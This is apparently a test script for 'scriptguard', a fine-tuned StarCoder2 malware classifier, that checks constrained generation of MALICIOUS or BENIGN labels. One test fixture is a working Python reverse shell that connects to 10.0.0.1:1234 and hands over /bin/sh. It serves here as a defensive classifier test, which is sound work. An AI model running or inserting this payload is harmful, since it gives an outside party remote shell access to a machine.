"""
Test script for constrained generation with ClassificationConstraintProcessor.
Tests if the model can be forced to output only MALICIOUS or BENIGN.
"""

import torch
from pathlib import Path
from transformers import AutoTokenizer, AutoModelForCausalLM, LogitsProcessorList
from peft import PeftModel
from scriptguard.steps.model_evaluation import ClassificationConstraintProcessor
from scriptguard.utils.prompts import format_inference_prompt, parse_classification_output
from scriptguard.utils.logger import logger

def find_latest_checkpoint():
    """Find the latest fine-tuned adapter checkpoint."""
    checkpoints_dir = Path("../../models/scriptguard-model")

    # Try final adapter first
    final_adapter = checkpoints_dir / "final_adapter"
    if final_adapter.exists():
        return str(final_adapter)

    # Otherwise, find latest checkpoint
    checkpoints = list(checkpoints_dir.glob("checkpoint-*"))
    if checkpoints:
        latest = max(checkpoints, key=lambda p: int(p.name.split("-")[1]))
        return str(latest)

    return None

def test_constrained_generation():
    """Test the constrained generation approach."""

    logger.info("=" * 60)
    logger.info("TESTING CONSTRAINED GENERATION")
    logger.info("=" * 60)

    # Find fine-tuned adapter
    adapter_path = find_latest_checkpoint()
    if not adapter_path:
        logger.error("No fine-tuned adapter found in models/scriptguard-model/")
        logger.error("Please run training first: python src/main.py")
        return

    # Load base model
    model_id = "bigcode/starcoder2-3b"
    logger.info(f"Loading base model: {model_id}")
    logger.info(f"Loading adapter: {adapter_path}")

    tokenizer = AutoTokenizer.from_pretrained(model_id)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token

    # Load model (use CPU for testing if needed)
    device = "cuda" if torch.cuda.is_available() else "cpu"
    logger.info(f"Using device: {device}")

    try:
        # Load base model
        base_model = AutoModelForCausalLM.from_pretrained(
            model_id,
            torch_dtype=torch.float16 if device == "cuda" else torch.float32,
            low_cpu_mem_usage=True
        )
        base_model = base_model.to(device)

        # Load fine-tuned adapter
        model = PeftModel.from_pretrained(base_model, adapter_path)
        model.eval()
        logger.info("✅ Model and adapter loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load model: {e}")
        return

    # Test cases
    test_cases = [
        {
            "code": "import os\nimport sys\nprint('Hello World')",
            "expected": "benign",
            "description": "Simple benign script"
        },
        {
            "code": "import socket\nimport subprocess\ns=socket.socket()\ns.connect(('10.0.0.1',1234))\nsubprocess.call(['/bin/sh'],stdin=s.fileno())",
            "expected": "malicious",
            "description": "Reverse shell (malicious)"
        },
        {
            "code": "def add(a, b):\n    return a + b\n\nresult = add(2, 3)",
            "expected": "benign",
            "description": "Simple function"
        }
    ]

    logger.info("\n" + "=" * 60)
    logger.info("TESTING WITH Constraint Processor")
    logger.info("=" * 60)

    # Debug: Check tokenization of MALICIOUS vs BENIGN
    logger.info("\n" + "=" * 60)
    logger.info("TOKEN ANALYSIS")
    logger.info("=" * 60)

    malicious_tokens = tokenizer.encode("MALICIOUS", add_special_tokens=False)
    benign_tokens = tokenizer.encode("BENIGN", add_special_tokens=False)
    malicious_space = tokenizer.encode(" MALICIOUS", add_special_tokens=False)
    benign_space = tokenizer.encode(" BENIGN", add_special_tokens=False)

    logger.info(f"'MALICIOUS' tokens: {malicious_tokens} ({len(malicious_tokens)} tokens)")
    logger.info(f"'BENIGN' tokens: {benign_tokens} ({len(benign_tokens)} tokens)")
    logger.info(f"' MALICIOUS' tokens: {malicious_space} ({len(malicious_space)} tokens)")
    logger.info(f"' BENIGN' tokens: {benign_space} ({len(benign_space)} tokens)")

    logger.info(f"\nDecoded:")
    logger.info(f"  MALICIOUS: {[tokenizer.decode([t]) for t in malicious_tokens]}")
    logger.info(f"  BENIGN: {[tokenizer.decode([t]) for t in benign_tokens]}")
    logger.info(f"  With space MALICIOUS: {[tokenizer.decode([t]) for t in malicious_space]}")
    logger.info(f"  With space BENIGN: {[tokenizer.decode([t]) for t in benign_space]}")

    correct = 0
    total = len(test_cases)

    for i, test in enumerate(test_cases):
        logger.info(f"\n--- Test Case {i+1}: {test['description']} ---")

        prompt = format_inference_prompt(test['code'], max_code_length=200)
        inputs = tokenizer(prompt, return_tensors="pt", truncation=True, max_length=512)
        inputs = {k: v.to(device) for k, v in inputs.items()}

        # Apply constraint processor
        constraint_processor = ClassificationConstraintProcessor(
            tokenizer=tokenizer,
            boost_factor=15.0
        )
        logits_processor = LogitsProcessorList([constraint_processor])

        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=3,
                min_new_tokens=1,
                do_sample=False,
                pad_token_id=tokenizer.pad_token_id,
                eos_token_id=tokenizer.eos_token_id,
                logits_processor=logits_processor
            )

        generated_text = tokenizer.decode(outputs[0], skip_special_tokens=True)
        prediction_part = generated_text.split("Classification:")[-1].strip()[:100]

        logger.info(f"Expected: {test['expected']}")
        logger.info(f"Generated: {prediction_part}")

        try:
            predicted_label = parse_classification_output(generated_text)
            logger.info(f"Parsed label: {'malicious' if predicted_label == 1 else 'benign'}")

            # Check if it matches expected
            expected_label = 1 if test['expected'] == 'malicious' else 0
            if predicted_label == expected_label:
                logger.info("✅ CORRECT")
                correct += 1
            else:
                logger.warning("❌ INCORRECT")
        except Exception as e:
            logger.error(f"Parsing failed: {e}")

    logger.info("\n" + "=" * 60)
    logger.info("TEST COMPLETED")
    logger.info("=" * 60)
    logger.info(f"Accuracy: {correct}/{total} ({100*correct/total:.1f}%)")
    if correct == total:
        logger.info("✅ ALL TESTS PASSED!")
    elif correct > 0:
        logger.warning(f"⚠️  {total - correct} test(s) failed")
    else:
        logger.error("❌ ALL TESTS FAILED - Model may need retraining")

if __name__ == "__main__":
    test_constrained_generation()
